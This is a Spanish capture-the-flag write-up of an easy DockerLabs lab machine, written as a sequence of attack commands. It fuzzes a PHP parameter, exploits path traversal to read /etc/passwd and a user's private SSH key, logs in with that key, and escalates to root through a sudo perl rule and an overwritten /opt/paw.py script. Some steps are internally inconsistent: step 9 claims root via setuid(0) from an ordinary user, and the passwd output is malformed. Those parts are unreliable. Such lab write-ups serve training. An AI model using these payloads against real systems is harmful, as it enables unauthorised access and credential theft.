# Write-up - Path Traversal y Escalada con Python

**Sitio:** DockerLabs  
**Dificultad:** Fácil  
**Fecha:** 13/06/2025  
**Aprendizaje:**  
- Reforzar el uso de `ffuf` y ataques de Path Traversal.  
- Prestar atención a detalles en páginas web para obtener pistas.  
- Búsqueda y utilización de claves SSH.  
- Uso de `chmod` y escaladas mediante `python`.  
- Creación y modificación de scripts para escalar privilegios.

---

## Enumeración y acceso inicial

### 1. Escaneo de puertos

`sudo nmap -sSV -O --open 172.17.0.2`

> Resultado:

21/tcp open ftp `vsftpd 3.0.5`  
22/tcp open ssh `OpenSSH 9.6p1 Ubuntu`  
80/tcp open http `Apache 2.4.58`  
OS detectado: `Linux`  

### 2. Enumeración de directorios

`gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/rockyou.txt -x php,html,txt -q -b 404,403`

> Rutas encontradas:

* `/assets` con un `background.jpg` sin contenido oculto útil.

### 3. Fuzzing + Path Traversal con ffuf

`ffuf -u http://172.17.0.2/index.php?FUZZ=../../../../../etc/passwd -w /usr/share/wordlists/dirb/common.txt -fc 200`

> Parámetro encontrado: `secret`  
> Prueba exitosa:  

`http://172.17.0.2/index.php?secret=../../../../../etc/passwd`  

> Resultado:  

`/root:/root:/bin/bash`  
`/home/luisillo:/bin/sh`  
`/home/vaxei:/bin/bash`  

## Obtención y uso de clave SSH  

### 4. Acceso a clave privada SSH de vaxei  

`http://172.17.0.2/index.php?secret=../../../../../home/vaxei/.ssh/id_rsa`  

> Se copia y guarda como `vaxei_clave_ssh`  

### 5. Asignación de permisos correctos  

`chmod u+rw,g-rw,o-rw vaxei_clave_ssh`  

### 6. Acceso vía SSH  

`ssh -l vaxei -i vaxei_clave_ssh 172.17.0.2`  

> Acceso concedido como `vaxei`  

## Escalada de privilegios  

### 7. Revisión de sudo como vaxei  

`sudo -l`  

> Resultado:  
> `(luisillo) NOPASSWD: /usr/bin/perl`  

### 8. Cambio a usuario luisillo  

`sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'`  

> Shell como `luisillo` (usuario común)  

### 9. Escalada total con setuid()  

`sudo -u luisillo /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'`  

> Acceso root conseguido  

### 10. Revisión final de sudo  

`sudo -l`  

> Resultado:   
> `(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py`  

### 11. Sustitución del script en /opt  

cd /opt  
rm -rf paw.py  

cat << EOF > paw.py  
#!/usr/bin/env python3  
import subprocess  
subprocess.run(["/bin/bash"])  
EOF  

### 12. Ejecución final  

`sudo /usr/bin/python3 /opt/paw.py`  

> `whoami = root`
